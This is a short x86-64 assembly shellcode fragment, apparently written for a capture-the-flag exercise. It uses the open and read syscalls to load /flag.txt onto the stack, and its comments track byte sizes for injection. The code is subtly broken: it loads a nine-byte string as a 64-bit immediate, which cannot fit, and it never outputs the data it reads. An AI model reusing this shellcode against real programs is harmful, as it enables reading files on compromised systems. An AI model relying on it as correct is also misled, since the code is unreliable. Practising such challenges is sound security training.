; shellcode
; read /flag.txt

    xor rsi, rsi
    push rsi                    ; push null terminator
    mov rdi, 0x7478742e67616c662f ; '/flag.txt' (little-endian)
    push rdi
    mov al, 2                   ; open syscall (1 byte)
    mov rdi, rsp                ; filename pointer
    syscall

    mov dil, al                 ; fd from open (1 byte)
    mov al, 0                   ; read syscall (1 byte)
    push rsp
    pop rsi                     ; buffer on stack
    mov dl, 50                  ; read size (1 byte)
    syscall
